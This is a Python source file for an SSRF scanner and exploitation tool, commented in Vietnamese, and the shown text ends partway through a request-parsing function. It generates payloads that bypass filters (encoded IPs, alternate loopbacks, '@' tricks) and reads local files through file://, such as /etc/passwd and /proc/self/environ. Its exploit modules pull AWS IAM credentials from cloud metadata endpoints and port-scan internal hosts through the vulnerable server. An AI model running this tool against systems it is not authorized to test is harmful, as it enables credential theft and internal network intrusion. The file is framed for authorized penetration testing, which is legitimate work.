#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
 ssrf_scanner.py  -  SSRF detection & testing tool  (all-in-one)
==============================================================================
 Python stdlib only (>=3.10), no external dependencies.
 For authorized security testing only.

 Detection techniques:
   - OAST (out-of-band): payload calls back to canary server  => CONFIRMED
   - Direct            : response leaks internal data (metadata, root:x:0:0) => CONFIRMED
   - Time-based        : non-responsive IP, response-time delta => FIRM
   - Error/diff        : response differs from baseline => TENTATIVE

 Examples:
   python ssrf_scanner.py -u "http://127.0.0.1:5000/fetch?url=FUZZ" --oast-listen 8000
   python ssrf_scanner.py -u "http://host/page?img=http://a.com&id=1"
   python ssrf_scanner.py -u "http://host/api?target=x" -p target -o report.json
==============================================================================
"""
from __future__ import annotations

import argparse
import getpass
import http.cookiejar
import ipaddress
import json
import secrets
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

# Console Windows mac dinh cp1252 -> ep UTF-8 de in duoc tieng Viet co dau.
try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

FUZZ = "FUZZ"  # marker nguoi dung dat vao URL de chi diem chen

BANNER = r"""
  ___ ___ ___  ___   ___
 / __/ __| _ \| __| / __| __ __ _ _ _
 \__ \__ \   /| _|  \__ \/ _/ _` | ' \
 |___/___/_|_\|_|   |___/\__\__,_|_||_|   SSRF Scanner v1.1
"""


# =============================================================================
#  PHAN 1 - SINH PAYLOAD (+ ky thuat bypass filter)
# =============================================================================
@dataclass
class Payload:
    value: str                 # chuoi se thay vao tham so
    technique: str             # direct / bypass / port-scan / scheme / time / oast
    target: str                # muc tieu mo ta
    note: str = ""             # ghi chu
    oast_token: str = ""       # token OAST de doi chieu callback
    signatures: list[str] = field(default_factory=list)  # dau hieu can tim trong response


# Cac muc tieu noi bo "ngon an" + dau hieu nhan biet noi dung noi bo trong response
INTERNAL_TARGETS: list[tuple[str, list[str]]] = [
    ("127.0.0.1", []),
    ("localhost", []),
    ("0.0.0.0", []),
    ("169.254.169.254", ["ami-id", "instance-id", "iam", "meta-data", "computeMetadata"]),  # AWS/cloud metadata
    ("metadata.google.internal", ["computeMetadata", "project-id"]),                        # GCP
    ("100.100.100.100", ["meta-data"]),                                                     # Alibaba
]
FILE_SIGNATURES = ["root:x:0:0:", "daemon:", "[extensions]", "for 16-bit app support"]


def _ip_variants(host: str) -> list[tuple[str, str]]:
    """Voi host IPv4, sinh cac bien the ma hoa khac nhau de BYPASS filter."""
    try:
        ip = ipaddress.IPv4Address(host)
    except ipaddress.AddressValueError:
        return []
    n = int(ip)
    variants = [
        (str(ip), "dang thap phan chuan"),
        (str(n), "IP dang so nguyen (decimal)"),
        (hex(n), "IP dang hex (0x...)"),
        ("0" + oct(n)[2:], "IP dang octal"),
    ]
    if str(ip).split(".")[0] == "127":
        variants.append(("127.1", "localhost rut gon 127.1"))
    return variants


def build_payloads(oast_host: str | None = None, include_file_scheme: bool = True) -> list[Payload]:
    payloads: list[Payload] = []

    # 1) Direct + bypass toi cac muc tieu noi bo
    for host, sigs in INTERNAL_TARGETS:
        variants = _ip_variants(host) or [(host, "dang ten/host chuan")]
        for value, desc in variants:
            technique = "direct" if desc.endswith("chuan") else "bypass"
            payloads.append(Payload(f"http://{value}/", technique, host, desc, signatures=sigs))
            for port in (80, 8080, 22, 3306, 6379):
                payloads.append(Payload(
                    f"http://{value}:{port}/", "port-scan", f"{host}:{port}",
                    f"do cong {port} ({desc})", signatures=sigs))

    # 2) Bypass bang '@'
    payloads.append(Payload("http://expected-trusted.com@127.0.0.1/", "bypass",
                            "127.0.0.1", "dung '@' danh lua phan host"))

    # 2b) Loopback THAY THE: ca dai 127.0.0.0/8 deu la loopback -> vuot blacklist
    #     chi chan dung chuoi "127.0.0.1". Day la ky thuat bypass rat thuc te.
    for alt in ("127.0.0.2", "127.0.0.3", "127.1.1.1", "127.127.127.127"):
        payloads.append(Payload(f"http://{alt}/", "bypass", alt,
                                "loopback thay the (vuot blacklist 127.0.0.1)"))

    # 3) IPv6 loopback
    payloads.append(Payload("http://[::1]/", "bypass", "::1", "IPv6 loopback"))
    payloads.append(Payload("http://[0:0:0:0:0:ffff:127.0.0.1]/", "bypass",
                            "127.0.0.1", "IPv4-mapped IPv6"))
    # 4) Scheme khac
    if include_file_scheme:
        for path in ("/etc/passwd", "/etc/hostname", "c:/windows/win.ini"):
            payloads.append(Payload(f"file://{path}", "scheme", path,
                                    "doc file noi bo qua file://", signatures=FILE_SIGNATURES))
        payloads.append(Payload("dict://127.0.0.1:6379/info", "scheme", "redis",
                                "tham do redis qua dict://"))
    # 5) Time-based (blind): IP non-routable -> timeout dai
    payloads.append(Payload("http://10.255.255.1/", "time", "10.255.255.1",
                            "IP non-routable, do chenh lech timeout (blind)"))
    # 6) OAST (tin cay nhat) - ho tro nhieu loai server OOB:
    #      * Burp Collaborator / interactsh / requestrepo (domain) -> token o SUBDOMAIN (bat ca DNS)
    #      * webhook.site / dich vu co duong dan rieng          -> token o PATH
    #      * canary cuc bo / IP                                 -> token o PATH
    if oast_host:
        has_scheme = "://" in oast_host
        parsed = urlparse(oast_host if has_scheme else "http://" + oast_host)
        netloc = parsed.netloc or oast_host
        base_path = parsed.path.rstrip("/")  # '' neu khong co path
        host_only = netloc.split(":")[0]
        port_part = (":" + netloc.split(":")[1]) if ":" in netloc else ""
        is_ip = host_only.count(".") == 3 and all(p.isdigit() for p in host_only.split("."))

        # Co path (vd webhook.site/<uuid>) hoac la IP -> gan token vao PATH.
        # Domain tran (Burp/interactsh/requestrepo) -> gan token vao SUBDOMAIN.
        path_mode = bool(base_path) or is_ip
        schemes = [parsed.scheme] if has_scheme else ("http", "https")

        # Danh sach canary: ban than no; neu la 127.0.0.1 (canary cuc bo) thi them
        # loopback thay the de VUOT filter ma van goi ve canary (binding 0.0.0.0).
        canary = [(netloc, base_path, "callback truc tiep")]
        if host_only == "127.0.0.1" and not base_path:
            for alt in ("127.0.0.2", "127.1.1.1"):
                canary.append((alt + port_part, "",
                               f"loopback thay the {alt} (vuot blacklist)"))

        for cnet, cpath, cnote in canary:
            for scheme in schemes:
                token = secrets.token_hex(6)
                if path_mode or cpath:
                    value = f"{scheme}://{cnet}{cpath}/{token}"
                else:
                    value = f"{scheme}://{token}.{cnet}/ssrf"
                payloads.append(Payload(value, "oast", cnet,
                                        f"{cnote} ({scheme})", oast_token=token))
    return payloads


# =============================================================================
#  PHAN 2 - SERVER CANARY OAST (bat callback blind SSRF)
# =============================================================================
class _Interactions:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._hits: list[dict] = []

    def add(self, hit: dict) -> None:
        with self._lock:
            self._hits.append(hit)

    def has_token(self, token: str) -> bool:
        if not token:
            return False
        with self._lock:
            return any(token in h["raw"] for h in self._hits)


INTERACTIONS = _Interactions()


class _CanaryHandler(BaseHTTPRequestHandler):
    def _record(self) -> None:
        INTERACTIONS.add({
            "time": time.time(), "method": self.command, "path": self.path,
            "src": self.client_address[0],
            "raw": f"{self.command} {self.path} Host:{self.headers.get('Host', '')}",
        })
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = do_POST = do_PUT = do_HEAD = _record

    def log_message(self, *a) -> None:
        pass


class OastServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 8000) -> None:
        self.host, self.port = host, port
        self._server: ThreadingHTTPServer | None = None

    def start(self) -> None:
        self._server = ThreadingHTTPServer((self.host, self.port), _CanaryHandler)
        threading.Thread(target=self._server.serve_forever, daemon=True).start()

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._server.server_close()


# =============================================================================
#  PHAN 3 - LOI PHAT HIEN (chay da luong bang ThreadPoolExecutor)
# =============================================================================
@dataclass
class Finding:
    param: str
    payload: Payload
    verdict: str          # CONFIRMED / LIKELY / POSSIBLE
    evidence: str
    status: int | None = None
    elapsed: float = 0.0


@dataclass
class Baseline:
    clean_len: int      # do dai response (da bo chuoi payload bi echo) khi fetch THAT BAI
    elapsed: float      # thoi gian phan hoi khi fetch that bai


@dataclass
class _Resp:
    status: int | None
    body: str
    length: int


SUSPICIOUS_PARAMS = {
    "url", "uri", "link", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "return", "returnurl", "next", "path", "continue", "img",
    "image", "imageurl", "fetch", "feed", "host", "site", "html", "file",
    "document", "domain", "callback", "webhook", "proxy", "load", "page", "data",
}

# Cac header server hay dung de di fetch -> cung la diem chen SSRF pho bien.
SSRF_HEADERS = ["Referer", "X-Forwarded-For", "X-Forwarded-Host",
                "X-Real-IP", "True-Client-IP", "Forwarded"]


@dataclass
class Target:
    """Mo ta request GOC se bi fuzz (thay cho viec truyen roi tung tham so)."""
    url: str
    body: str | None = None            # noi dung body (form hoac JSON) dang chuoi
    is_json: bool = False              # body co phai JSON khong
    headers: dict = field(default_factory=dict)


# -------------------- Ho tro JSON body --------------------
def _json_string_paths(obj, prefix=""):
    """Liet ke duong dan (dotted) toi moi gia tri CHUOI trong JSON.
    Vi du {"a": {"url": "x"}} -> ['a.url']."""
    paths = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            paths += _json_string_paths(v, f"{prefix}{k}.")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            paths += _json_string_paths(v, f"{prefix}{i}.")
    elif isinstance(obj, str):
        paths.append(prefix[:-1])      # bo dau cham o cuoi
    return paths


def _json_set(obj, path, value):
    """Gan `value` vao `path` (dotted) trong obj. Sua truc tiep tren obj."""
    keys = path.split(".")
    cur = obj
    for k in keys[:-1]:
        cur = cur[int(k)] if isinstance(cur, list) else cur[k]
    last = keys[-1]
    if isinstance(cur, list):
        cur[int(last)] = value
    else:
        cur[last] = value


# -------------------- Xac dinh diem chen (location, key) --------------------
# location: 'url' (query) | 'form' (body x-www-form-urlencoded) | 'json' (body JSON) | 'header'
def find_points(target: Target, explicit_param):
    # 1) Co marker FUZZ -> uu tien tuyet doi, chi chen dung do
    if FUZZ in target.url:
        return [("url", FUZZ)]
    if target.body and FUZZ in target.body:
        return [("json" if target.is_json else "form", FUZZ)]

    points = []
    query = dict(parse_qsl(urlparse(target.url).query))

    # 2) Nguoi dung chi dinh ten tham so cu the
    if explicit_param:
        if explicit_param in query:
            points.append(("url", explicit_param))
        if target.body and not target.is_json and explicit_param in dict(parse_qsl(target.body)):
            points.append(("form", explicit_param))
        points = points or [("url", explicit_param)]
    else:
        # 3) Tu dong: tham so trong query string (uu tien ten nghi ngo)
        sus = [k for k in query if k.lower() in SUSPICIOUS_PARAMS]
        points += [("url", k) for k in (sus or list(query.keys()))]
        # 4) Tu dong: cac truong trong body
        if target.body and target.is_json:
            try:
                points += [("json", p) for p in _json_string_paths(json.loads(target.body))]
            except Exception:
                pass
        elif target.body:
            form = dict(parse_qsl(target.body))
            sus = [k for k in form if k.lower() in SUSPICIOUS_PARAMS]
            points += [("form", k) for k in (sus or list(form.keys()))]

    # 5) Luon thu them cac header hay dinh SSRF
    points += [("header", h) for h in SSRF_HEADERS]
    return points


def apply_injection(target: Target, loc, key, value):
    """Chen `value` vao (loc, key). Tra ve (url, body_bytes, headers) de gui di."""
    url = target.url
    headers = dict(target.headers)
    body = target.body

    if loc == "header":
        headers[key] = value
    elif key == FUZZ:                               # thay marker FUZZ truc tiep
        if loc == "url":
            url = url.replace(FUZZ, value)
        else:
            body = (body or "").replace(FUZZ, value)
    elif loc == "url":                              # thay 1 tham so trong query
        parts = urlparse(url)
        q = dict(parse_qsl(parts.query)); q[key] = value
        url = urlunparse(parts._replace(query=urlencode(q)))
    elif loc == "form":                             # thay 1 truong trong body form
        q = dict(parse_qsl(body or "")); q[key] = value
        body = urlencode(q)
    elif loc == "json":                             # thay 1 truong trong body JSON
        obj = json.loads(body); _json_set(obj, key, value); body = json.dumps(obj)

    return url, (body.encode() if body is not None else None), headers


class Scanner:
    def __init__(self, *, oast_host=None, timeout=6.0, concurrency=20,
                 time_threshold=5.0, method="GET", base_headers=None,
                 proxy=None) -> None:
        self.oast_host = oast_host
        self.timeout = timeout
        self.concurrency = concurrency
        self.time_threshold = time_threshold
        self.method = method.upper()
        self.base_headers = dict(base_headers or {})     # header goc (cookie, content-type, -H)
        # Opener: giu cookie jar (session), va di qua proxy neu co (vd Burp 127.0.0.1:8080).
        handlers = [urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
        self.cookiejar = handlers[0].cookiejar
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
            handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
        self.opener = urllib.request.build_opener(*handlers)

    def login(self, auth_url, user, password, user_field="username", pass_field="password") -> bool:
        """Dang nhap bang form de lay session cookie (POST x-www-form-urlencoded)."""
        body = urlencode({user_field: user, pass_field: password}).encode()
        try:
            req = urllib.request.Request(auth_url, data=body, method="POST",
                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
            self.opener.open(req, timeout=self.timeout)
            got = [c.name for c in self.cookiejar]
            print(f" [*] Dang nhap xong. Cookie nhan duoc: {got or '(khong co - kiem tra lai)'}")
            return bool(got)
        except Exception as e:
            print(f" [!] Loi dang nhap: {type(e).__name__}: {e}")
            return False

    def cookie_header(self) -> str:
        """Gom cookie hien co (tu --cookie va/hoac session sau login) thanh 1 chuoi."""
        parts = [self.base_headers["Cookie"]] if self.base_headers.get("Cookie") else []
        parts += [f"{c.name}={c.value}" for c in self.cookiejar]
        return "; ".join(parts)

    def _request(self, url, body=None, headers=None):
        """Gui 1 request. Tra ve (_Resp | None, elapsed_giay, ten_loi | None)."""
        start = time.perf_counter()
        method = "POST" if body else self.method
        try:
            req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
            with self.opener.open(req, timeout=self.timeout) as r:
                content = r.read(20000).decode("utf-8", "replace")
                return _Resp(r.status, content, len(content)), time.perf_counter() - start, None
        except urllib.error.HTTPError as e:
            content = ""
            try:
                content = e.read(20000).decode("utf-8", "replace")
            except Exception:
                pass
            return _Resp(e.code, content, len(content)), time.perf_counter() - start, f"HTTP{e.code}"
        except Exception as e:
            return None, time.perf_counter() - start, type(e).__name__

    def _dead_baseline(self, target, loc, key) -> Baseline:
        """Baseline 'host chet': chen 1 URL CHAC CHAN khong ket noi duoc (.invalid).
        -> cho biet app tra ve gi khi fetch THAT BAI. Dung lam moc so sanh de bot bao nham.
        Do dai duoc tinh sau khi BO chuoi payload bi echo lai (tranh nhieu do URL khac nhau)."""
        dead = f"http://dead-{secrets.token_hex(4)}.invalid/"
        url, body, headers = apply_injection(target, loc, key, dead)
        resp, elapsed, _ = self._request(url, body, headers)
        clean_len = len(resp.body.replace(dead, "")) if resp else 0
        return Baseline(clean_len=clean_len, elapsed=elapsed)

    def _analyze(self, p, resp, elapsed, err, baseline) -> Finding | None:
        body = resp.body.lower() if resp is not None else ""

        # (1) OAST: nhan duoc callback ve canary => chac chan
        if p.technique == "oast" and INTERACTIONS.has_token(p.oast_token):
            return Finding("", p, "CONFIRMED",
                           f"Nhan callback OAST voi token {p.oast_token}",
                           resp.status if resp else None, elapsed)

        # (2) Direct: response lo dau hieu noi bo => chac chan
        for sig in p.signatures:
            if sig.lower() in body:
                return Finding("", p, "CONFIRMED",
                               f"Response chua dau hieu noi bo: '{sig}'",
                               resp.status if resp else None, elapsed)

        # (3) Time-based: phan hoi cham bat thuong so voi baseline => do tin cay cao
        if p.technique == "time":
            if elapsed >= self.time_threshold and elapsed > baseline.elapsed * 3 + 1:
                return Finding("", p, "LIKELY",
                               f"Phan hoi {elapsed:.1f}s (baseline {baseline.elapsed:.1f}s) "
                               f"-> server co the dang co ket noi IP noi bo",
                               resp.status if resp else None, elapsed)

        # (4) Diff: so voi baseline 'host chet' SAU KHI bo payload echo.
        #     Chi bao khi noi dung thuc su khac -> tranh bao nham (app boc response).
        if p.technique in ("direct", "bypass", "port-scan", "scheme") and resp is not None:
            clean_len = len(resp.body.replace(p.value, ""))
            if resp.status and resp.status < 400 and abs(clean_len - baseline.clean_len) > 120:
                return Finding("", p, "POSSIBLE",
                               f"Noi dung khac han luc fetch that bai "
                               f"(len {clean_len} vs {baseline.clean_len}) -> co fetch duoc gi do",
                               resp.status, elapsed)
        return None

    def scan(self, target: Target, explicit_param):
        """Quet toan bo: tao danh sach cong viec (diem chen x payload) roi chay SONG SONG het."""
        points = find_points(target, explicit_param)

        # Baseline rieng cho tung diem chen + danh sach cong viec.
        baselines, tasks = {}, []
        for pt in points:
            loc, key = pt
            baselines[pt] = self._dead_baseline(target, loc, key)
            # Moi diem chen co bo payload rieng (token OAST moi) -> callback xac dinh dung diem chen.
            payloads = build_payloads(oast_host=self.oast_host)
            if loc == "header":        # header chi thu payload manh (OAST + direct) cho nhanh
                payloads = [p for p in payloads if p.technique in ("oast", "direct")]
            tasks += [(pt, p) for p in payloads]

        def run(task):
            (loc, key), p = task
            url, body, headers = apply_injection(target, loc, key, p.value)
            resp, elapsed, err = self._request(url, body, headers)
            f = self._analyze(p, resp, elapsed, err, baselines[(loc, key)])
            if f:
                f.param = f"{loc}:{key}"
            return f, task

        findings, oast_tasks = [], []
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            for f, task in pool.map(run, tasks):
                if f:
                    findings.append(f)
                if task[1].technique == "oast":
                    oast_tasks.append(task)

        # OAST callback co the toi TRE -> cho 1 lan roi quet lai cac token chua bao.
        have = {f.payload.oast_token for f in findings if f.payload.oast_token}
        if oast_tasks:
            time.sleep(1.5)
            for (loc, key), p in oast_tasks:
                if p.oast_token not in have and INTERACTIONS.has_token(p.oast_token):
                    findings.append(Finding(f"{loc}:{key}", p, "CONFIRMED",
                                            f"Nhan callback OAST (tre) token {p.oast_token}"))
                    have.add(p.oast_token)

        labels = [f"{loc}:{key}" for loc, key in points]
        payloads_per_point = len(build_payloads(oast_host=self.oast_host))
        return findings, labels, payloads_per_point


# =============================================================================
#  PHAN 4 - BAO CAO + KET LUAN (in ra payload hoat dong)
# =============================================================================
# Muc do tin cay (confidence) theo chuan cong cu bao mat (vd Burp Suite):
#   CONFIRMED  - co bang chung truc tiep (callback OAST / lo du lieu noi bo)
#   FIRM       - do tin cay cao nhung gian tiep (blind theo thoi gian)
#   TENTATIVE  - dau hieu bat thuong, can xac minh thu cong
VERDICT_ORDER = {"CONFIRMED": 0, "LIKELY": 1, "POSSIBLE": 2}
VERDICT_LABEL = {
    "CONFIRMED": "[CONFIRMED]",
    "LIKELY":    "[FIRM]     ",
    "POSSIBLE":  "[TENTATIVE]",
}
VERDICT_NAME = {"CONFIRMED": "CONFIRMED", "LIKELY": "FIRM", "POSSIBLE": "TENTATIVE"}
SEVERITY = "High"  # SSRF nhin chung xep muc nghiem trong cao (CVSS ~7-9)


def print_report(findings, params, payloads_count, only_confirmed=False) -> None:
    print("\n" + "=" * 66)
    print(" SSRF SCAN FINDINGS")
    print("=" * 66)
    print(f" Injection points : {len(params)} ({', '.join(params[:6])}{' ...' if len(params) > 6 else ''})")
    print(f" Payloads/point   : {payloads_count}")
    print(f" Total findings   : {len(findings)}")
    print("-" * 66)

    shown = findings
    if only_confirmed:
        shown = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
        print(f" (--only-confirmed: hien {len(shown)}/{len(findings)}, an cac TENTATIVE)")

    if not shown:
        print(" No SSRF indicators detected." if not findings else " (khong co phat hien CONFIRMED/FIRM)")
        return

    for i, f in enumerate(sorted(shown, key=lambda x: VERDICT_ORDER.get(x.verdict, 9)), 1):
        label = VERDICT_LABEL.get(f.verdict, f.verdict)
        print(f"\n [{i:02d}] {label}  Severity: {SEVERITY}  |  Type: SSRF")
        print(f"      Injection : {f.param}")
        print(f"      Technique : {f.payload.technique} ({f.payload.note})")
        print(f"      Payload   : {f.payload.value}")
        print(f"      Evidence  : {f.evidence}")
        if f.status is not None:
            print(f"      Response  : HTTP {f.status}  |  {f.elapsed:.2f}s")


def _reconstruct(target: Target, label, value):
    """Tu label 'loc:key' dung lai request day du da chen payload.
    Tra ve (url, body_str | None, loc, key)."""
    loc, _, key = label.partition(":")
    url, body_bytes, _ = apply_injection(target, loc, key, value)
    return url, (body_bytes.decode() if body_bytes else None), loc, key


def print_conclusion(target: Target, findings, cookie=None) -> None:
    """Tom tat ket luan + danh sach payload tai hien duoc (proof-of-concept)."""
    print("\n" + "#" * 66)
    print("#  SUMMARY")
    print("#" * 66)

    confirmed = [f for f in findings if f.verdict == "CONFIRMED"]
    likely = [f for f in findings if f.verdict == "LIKELY"]
    possible = [f for f in findings if f.verdict == "POSSIBLE"]

    if confirmed:
        print(f"\n  Verdict : VULNERABLE - SSRF confirmed ({len(confirmed)} confirmed case(s)).")
    elif likely:
        print("\n  Verdict : LIKELY VULNERABLE - blind SSRF (time-based); verify manually.")
    elif possible:
        print("\n  Verdict : POTENTIAL - anomalies observed; manual verification required.")
    else:
        print("\n  Verdict : NOT DETECTED - no SSRF indicators with the current payload set.")
        print("#" * 66 + "\n")
        return
    print(f"  Severity: {SEVERITY}   |   Type: SSRF (CWE-918)")

    # Gom payload hoat dong, loai trung. TENTATIVE chi in toi da 5 cho gon.
    working = sorted(findings, key=lambda x: VERDICT_ORDER.get(x.verdict, 9))
    print("\n  PROOF-OF-CONCEPT - working payloads (copy for report / reproduction):")
    print("  " + "-" * 62)
    seen, tentative_shown = set(), 0
    for f in working:
        if (f.param, f.payload.value) in seen:
            continue
        seen.add((f.param, f.payload.value))
        if f.verdict == "POSSIBLE":
            tentative_shown += 1
            if tentative_shown > 5:
                continue
        full_url, full_body, loc, key = _reconstruct(target, f.param, f.payload.value)
        print(f"  {VERDICT_LABEL.get(f.verdict, f.verdict)}  {f.param}  ({f.payload.technique})")
        print(f"      payload   : {f.payload.value}")
        print(f"      full URL  : {full_url}")
        if full_body:
            print(f"      body      : {full_body}")
        if loc == "header":
            print(f"      header    : {key}: {f.payload.value}")
        print(f"      rationale : {f.evidence}")
        print("  " + "-" * 62)
    if tentative_shown > 5:
        print(f"  (... con {tentative_shown - 5} TENTATIVE nua, dung -o de xem day du trong JSON)")

    # Lenh curl tai hien nhanh payload manh nhat
    best = working[0]
    bu, bb, bloc, bkey = _reconstruct(target, best.param, best.payload.value)
    curl = "curl -s"
    if cookie:
        curl += f' -b "{cookie}"'
    if bloc == "header":
        curl += f' -H "{bkey}: {best.payload.value}"'
    if bb:
        curl += (f' -H "Content-Type: application/json" --data \'{bb}\''
                 if target.is_json else f' --data "{bb}"')
    curl += f' "{bu}"'
    print("\n  Reproduce the strongest finding:")
    print(f"      {curl}")
    print("\n" + "#" * 66 + "\n")


# =============================================================================
#  PHAN 4b - EXPLOITATION MODULES (khai thac sau khi phat hien SSRF)
#  Y tuong lay cam hung tu SSRFmap (swisskyrepo), viet lai doc lap. CHI DOC du lieu.
# =============================================================================
EXPLOIT_FILES = [
    "file:///etc/passwd", "file:///etc/hosts", "file:///etc/hostname",
    "file:///proc/self/environ", "file:///proc/self/cmdline",
    "file:///C:/Windows/win.ini", "file:///C:/Windows/System32/drivers/etc/hosts",
]

# (ten, URL metadata, header can thiet neu co). Nhieu provider (GCP/Azure) yeu cau
# header dac biet -> qua SSRF thuong KHONG dat duoc header, nen chi ky vong AWS/Alibaba.
CLOUD_ENDPOINTS = [
    ("AWS - danh sach IAM role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS - user-data", "http://169.254.169.254/latest/user-data"),
    ("AWS - instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
    ("Alibaba - metadata", "http://100.100.100.100/latest/meta-data/"),
    ("GCP - project (can header Metadata-Flavor)", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
    ("Azure - instance (can header Metadata:true)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
]

PORTSCAN_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8000, 9200, 27017, 11211]


import re as _re

# Dau hieu GIA TRI credential/metadata that (khong xuat hien khi app chi echo lai URL).
CLOUD_VALUE_SIGNS = [
    _re.compile(r'"AccessKeyId"'), _re.compile(r'"SecretAccessKey"'),
    _re.compile(r'"Token"\s*:'), _re.compile(r'\bASIA[0-9A-Z]{8,}'),   # AWS temp key
    _re.compile(r'\bAKIA[0-9A-Z]{8,}'),                                # AWS key
    _re.compile(r'\bi-[0-9a-f]{8,}\b'),                                # instance-id value
    _re.compile(r'ssh-rsa AAAA'), _re.compile(r'-----BEGIN'),
]


def _snippet(body: str, limit: int = 300) -> str:
    s = " ".join(body.split())
    return s[:limit] + (" ..." if len(s) > limit else "")


def _snippet_around(body: str, needle: str, span: int = 320) -> str:
    """Cat doan quanh vi tri `needle` (de lay NOI DUNG that, khong phai vo HTML)."""
    i = body.lower().find(needle.lower())
    if i < 0:
        return _snippet(body)
    seg = body[max(0, i - 20): i - 20 + span]
    return " ".join(seg.split())


def _extract(scanner, target, loc, key, payload_value):
    """Gui 1 payload qua diem chen (dung Target moi), tra ve (resp, elapsed, err)."""
    url, body, headers = apply_injection(target, loc, key, payload_value)
    return scanner._request(url, body, headers)


def mod_readfiles(scanner, target, loc, key) -> None:
    print("\n  [module: readfiles] doc file noi bo qua file://")
    hit = False
    for payload in EXPLOIT_FILES:
        resp, elapsed, err = _extract(scanner, target, loc, key, payload)
        if resp is None:
            continue
        matched = next((sig for sig in FILE_SIGNATURES if sig.lower() in resp.body.lower()), None)
        if matched:
            hit = True
            print(f"    [+] {payload}")
            print(f"        {_snippet_around(resp.body, matched, 360)}")
    if not hit:
        print("    [-] khong doc duoc file nao (co the bi chan scheme file://).")


def mod_cloud(scanner, target, loc, key) -> None:
    print("\n  [module: cloud] lay metadata dich vu cloud")
    hit = False
    for name, endpoint in CLOUD_ENDPOINTS:
        resp, elapsed, err = _extract(scanner, target, loc, key, endpoint)
        if resp is None or resp.status is None or resp.status >= 400 or not resp.body.strip():
            continue
        # chi nhan khi co GIA TRI credential/metadata that (tranh bao nham do app echo URL)
        m = next((p.search(resp.body) for p in CLOUD_VALUE_SIGNS if p.search(resp.body)), None)
        if m:
            hit = True
            print(f"    [+] {name}")
            print(f"        {endpoint}")
            print(f"        {_snippet_around(resp.body, m.group(0), 360)}")
    if not hit:
        print("    [-] khong lay duoc metadata (khong chay tren cloud, hoac bi chan IP 169.254.x).")


def mod_portscan(scanner, target, loc, key, host="127.0.0.1") -> None:
    print(f"\n  [module: portscan] quet cong noi bo tren {host} qua SSRF")
    # Baseline: cong gan nhu chac chan DONG -> de so sanh phan biet open/closed
    # (nhieu app boc moi response trong trang cua no, nen khong the chi check 'co response').
    bresp, bt, berr = _extract(scanner, target, loc, key, f"http://{host}:1/")
    base_len = bresp.length if bresp else -1
    found_open = False
    for port in PORTSCAN_PORTS:
        resp, elapsed, err = _extract(scanner, target, loc, key, f"http://{host}:{port}/")
        if resp is None and elapsed >= scanner.timeout - 0.4:
            state = "FILTERED (timeout)"
        elif resp is None:
            state = f"CLOSED ({err})"
        elif base_len >= 0 and abs(resp.length - base_len) > 60:
            state = "OPEN (phan hoi khac han cong dong)"
            found_open = True
        else:
            state = "closed/khong phan biet duoc"
        print(f"    - {host}:{port:<6} {state}   [{elapsed:.2f}s]")
    if not found_open:
        print("    [i] khong thay cong mo ro rang (hoac SSRF khong cho fetch IP noi bo).")


def run_exploit(scanner, target, points, modules) -> None:
    # Uu tien diem chen trong url/form/json (doc duoc response); tranh header.
    usable = [pt for pt in points if pt[0] != "header"] or points
    if not usable:
        print("\n [!] Khong co diem chen de khai thac.")
        return
    loc, key = usable[0]
    print("\n" + "#" * 66)
    print(f"#  EXPLOITATION  (diem chen: {loc}:{key})")
    print("#" * 66)
    want = set(modules)
    if "all" in want:
        want = {"readfiles", "cloud", "portscan"}
    if "readfiles" in want:
        mod_readfiles(scanner, target, loc, key)
    if "cloud" in want:
        mod_cloud(scanner, target, loc, key)
    if "portscan" in want:
        mod_portscan(scanner, target, loc, key)
    print("\n" + "#" * 66 + "\n")


def save_json(findings, params, path: str) -> None:
    data = {
        "vulnerability": "SSRF",
        "cwe": "CWE-918",
        "severity": SEVERITY,
        "vulnerable": any(f.verdict == "CONFIRMED" for f in findings),
        "injection_points": params,
        "findings": [{
            "injection_point": f.param,
            "confidence": VERDICT_NAME.get(f.verdict, f.verdict),  # CONFIRMED / FIRM / TENTATIVE
            "technique": f.payload.technique,
            "payload": f.payload.value,
            "evidence": f.evidence,
            "http_status": f.status,
            "elapsed_s": round(f.elapsed, 3),
        } for f in findings],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, ensure_ascii=False, indent=2)
    print(f" Report saved: {path}")


# =============================================================================
#  PHAN 5 - CLI
# =============================================================================
def parse_headers(items) -> dict:
    headers = {}
    for it in items or []:
        if ":" in it:
            k, v = it.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def parse_raw_request(path: str, force_https: bool = False):
    """
    Doc 1 raw HTTP request (xuat tu Burp Suite 'Copy to file' / Save item, hoac
    cac cong cu tuong tu) va tach thanh (method, url, headers, data).

    Vi du file:
        POST /api/fetch?x=1 HTTP/1.1
        Host: target.com
        Cookie: session=abc
        Content-Type: application/x-www-form-urlencoded

        url=FUZZ&id=1

    Dat marker FUZZ o duong dan hoac body de chi diem chen (khong co thi tu tim).
    """
    raw = open(path, "rb").read().decode("utf-8", "replace").replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [ln for ln in head.split("\n") if ln.strip()]
    if not lines:
        raise ValueError("File request rong hoac sai dinh dang.")

